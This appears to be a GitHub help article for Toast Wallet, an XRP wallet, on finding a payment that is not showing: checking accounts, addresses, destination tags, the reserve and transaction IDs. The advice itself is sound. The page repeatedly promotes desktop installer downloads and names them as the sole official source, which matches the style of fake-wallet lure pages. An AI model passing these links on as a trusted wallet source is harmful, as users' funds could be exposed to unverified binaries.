<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet transaction not showing</h1>

<p align="center">Checks to run when a sent or received payment is missing.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

When a transaction is not showing in Toast Wallet, check that you are on the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) and connected, that the right account is selected, and that the sender used your exact address. For exchange deposits, check the destination tag. Most "missing" payments turn out to be addressing or connection issues.

## 👀 You'll see this if

- Someone says they sent you XRP, but nothing appears.
- You sent XRP and the receiver has not seen it.
- Your transaction history looks incomplete.
- An exchange deposit has not been credited.

## 🤔 Why it happens

XRP payments are recorded on the public XRP Ledger within seconds. If a payment really happened, it exists there. When it does not appear in your wallet, the cause is usually on the viewing side: the wallet is offline, outdated or showing a different account. On the sending side, the usual culprits are a wrong address, a missing destination tag, or a payment that failed because of the reserve.

Separating "did it happen?" from "why can I not see it?" is the key to solving this calmly.

## 🧭 Before you start

Gather the details: the amount, the time, the sending and receiving addresses and, if available, the transaction ID from the sender or exchange. Write down your own `r` address so you can compare it with what the sender used.

## 🛠️ Fix: find the missing transaction

1. **Update Toast Wallet.** Older builds can show stale data. Install the current release following [update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md).
2. **Check the connection.** If balances do not load at all, follow [Toast Wallet not connecting fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-connecting-fix.md).
3. **Select the right account.** If you have several accounts, make sure you are viewing the one that should have received or sent the payment.
4. **Compare addresses.** Ask the sender for the address they used and compare every character with yours.
5. **Ask for the transaction ID.** Exchanges show it in their withdrawal history. A failed or pending status there means the problem is on their side.
6. **Check the tag for exchange deposits.** If you sent to an exchange, make sure the destination tag matched; see [Toast Wallet destination tag guide](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-destination-tag-guide.md).
7. **Check the reserve for new accounts.** A first payment below the reserve to a new address fails. See [activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md).

## 🧩 Real-world example

A user withdraws XRP from an exchange and waits, but Toast Wallet shows nothing. The exchange history shows "completed" with a transaction ID. Comparing addresses, they discover they pasted the address of an old Toast account they had created and forgotten. Switching accounts in Toast Wallet, they find the XRP waiting there. Nothing was lost; it was simply in another of their accounts.

## ⚠️ Common mistakes

- Looking at the wrong account in a wallet with several accounts.
- Assuming XRP is lost before checking the exchange's withdrawal status.
- Missing a destination tag when sending to an exchange.
- Paying a "transaction recovery" service that contacts you online.

## 🔁 If that did not work

- **The exchange shows the withdrawal as pending.** Wait or contact the exchange through its official site.
- **The address used was wrong.** Payments are final. If the address belongs to someone you know, ask them to return it.
- **The balance shows zero despite a confirmed payment.** See [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).

## 🛡️ Prevention

Label your accounts and copy addresses directly from Toast Wallet. Send small test payments to new destinations. Keep the app updated.

## 📝 Good to know

Because the XRP Ledger is public, the transaction ID is a powerful piece of information. It lets anyone confirm whether a payment happened, how much was sent and to which address, without revealing anything secret. Sharing a transaction ID with an exchange's official support is safe. Sharing your secret key, passphrase, six words or backup code is never needed to investigate a payment.

## 🔍 A closer look at transaction IDs

Every XRP Ledger payment has a transaction ID, a long string of letters and numbers often called a hash. Exchanges show it in their withdrawal history, and Toast Wallet shows details for payments in your own history. With this ID, anyone can look up the payment on a public XRP Ledger explorer and see whether it succeeded, which addresses were involved and whether a destination tag was included.

That makes the transaction ID the most useful piece of evidence when a payment seems to be missing. If it shows success and the destination is your address, the XRP arrived and the problem is how your wallet is displaying it. If it shows success to a different address, the payment went somewhere else. If it shows failure, the XRP never left the sender. Each answer points to a different next step.

## 🗂️ What to tell an exchange

When contacting an exchange about a deposit, use their official help pages and give them the transaction ID, the amount, the time and the destination tag you used. That is everything they need. Do not send screenshots of your wallet's settings, and never include your passphrase, six words, backup code or secret key. Real exchange staff will never ask for them.

If the exchange asks you to wait, keep the ticket number and avoid opening several tickets for the same payment, which can slow things down.

## ❓ FAQ

<details>
<summary>Can XRP get stuck in transit?</summary>

No. Payments either confirm in seconds or fail. There is no in-between state on the ledger.

</details>

<details>
<summary>Can Toast Wallet reverse a payment?</summary>

No. XRP payments are final.

</details>

<details>
<summary>Is it safe to share a transaction ID?</summary>

Yes. It is public information.

</details>

> [!WARNING]
> "Recovery agents" who message you about stuck transactions are scammers. Never give them your keys or words.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet not connecting fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-connecting-fix.md) | What to check when balances will not load. |
| [Toast Wallet destination tag guide](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-destination-tag-guide.md) | When a tag is required and what happens if it is missing. |
| [Receive XRP in Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/receive-xrp-in-toast-wallet.md) | Share the right address and confirm the payment arrived. |
| [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md) | Reasons a balance reads zero and how to confirm your XRP. |
